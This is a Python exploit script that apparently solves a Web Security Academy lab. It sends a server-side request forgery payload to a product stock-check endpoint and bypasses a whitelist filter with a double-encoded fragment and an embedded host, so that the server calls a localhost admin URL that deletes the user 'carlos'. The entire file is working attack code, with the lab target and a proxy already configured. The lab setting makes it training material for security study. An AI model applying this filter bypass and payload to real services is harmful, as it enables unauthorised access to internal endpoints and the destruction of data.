# === Standard Library ===
import time

# === Third-Party ===
try:
    import requests
except ImportError:
    raise ImportError("Install 'requests' with: pip install requests")

# === User Configuration ===
BASE_URL = "https://0a9100fc0335508880e2441e00cd00c7.web-security-academy.net"
PROXY = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}
USE_PROXY = False

# === Final SSRF Payload ===
PAYLOAD = (
    "http://localhost:80%2523@stock.weliketoshop.net"
    "/admin/delete?username=carlos"
)

# === Exploit Function ===
def send_whitelist_bypass():
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = f"stockApi={PAYLOAD}"

    print(f"[*] Sending final whitelist-bypass SSRF exploit to:\n{PAYLOAD}")
    res = requests.post(
        f"{BASE_URL}/product/stock",
        data=data,
        headers=headers,
        proxies=PROXY if USE_PROXY else None
    )

    if res.status_code == 200:
        print("[+] Exploit delivered. Check UI — Carlos should be gone.")
    else:
        print(f"[-] Status Code: {res.status_code} | Possible error. Check Burp and lab response.")

# === Main ===
if __name__ == "__main__":
    print("[*] Launching SSRF attack: Whitelist-based filter bypass...")
    send_whitelist_bypass()
